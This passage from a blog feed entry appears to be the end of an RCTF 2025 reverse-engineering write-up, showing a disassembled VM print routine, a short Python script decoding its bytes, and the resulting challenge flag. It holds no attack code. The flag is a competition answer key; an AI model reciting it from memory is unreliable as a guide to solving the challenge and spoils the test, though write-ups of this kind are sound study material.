print_byte 0x32</span><br><span class="line">6752: print_byte 0x64</span><br><span class="line">6754: print_byte 0x61</span><br><span class="line">6756: print_byte 0x36</span><br><span class="line">6758: print_byte 0x63</span><br><span class="line">675a: print_byte 0x31</span><br><span class="line">675c: print_byte 0x38</span><br><span class="line">675e: print_byte 0x37</span><br><span class="line">6760: print_byte 0x65</span><br><span class="line">6762: print_byte 0x64</span><br><span class="line">6764: print_byte 0x34</span><br><span class="line">6766: print_byte 0x36</span><br><span class="line">6768: print_byte 0x32</span><br><span class="line">676a: print_byte 0x62</span><br><span class="line">676c: print_byte 0x30</span><br><span class="line">676e: print_byte 0x33</span><br><span class="line">6770: print_byte 0x33</span><br><span class="line">6772: print_byte 0x66</span><br><span class="line">6774: print_byte 0x65</span><br><span class="line">6776: print_byte 0x65</span><br><span class="line">6778: print_byte 0x33</span><br><span class="line">677a: print_byte 0x34</span><br><span class="line">677c: print_byte 0x7d</span><br><span class="line">677e: print_byte 0x0a</span><br><span class="line">6780: halt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 所有 print_byte 里的十六进制字节</span></span><br><span class="line">bytes_hex = [</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>,</span><br><span class="line">    <span class="number">0x56</span>, <span class="number">0x4d</span>, <span class="number">0x5f</span>, <span class="number">0x41</span>, <span class="number">0x4c</span>, <span class="number">0x55</span>, <span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0x4d</span>, <span class="number">0x43</span>, <span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x34</span>, <span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x45</span>, <span class="number">0x43</span>, <span class="number">0x4b</span>, <span class="number">0x21</span>, <span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x33</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x36</span>, <span class="number">0x30</span>, <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x64</span>, <span class="number">0x32</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x36</span>, <span class="number">0x63</span>, <span class="number">0x31</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x34</span>, <span class="number">0x36</span>, <span class="number">0x32</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x7d</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bytes_hex)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RCTF{VM_ALU_SMC_RC4_SPECK!_593eb6079d2da6c187ed462b033fee34}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCTF-2025-RE-wp&quot;&gt;&lt;a href=&quot;#RCTF-2025-RE-wp&quot; class=&quot;headerlink&quot; title=&quot;RCTF 2025 RE wp&quot;&gt;&lt;/a&gt;RCTF 2025 RE wp&lt;/h1&gt;&lt;h2 id=&quot;chaos&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
</feed>
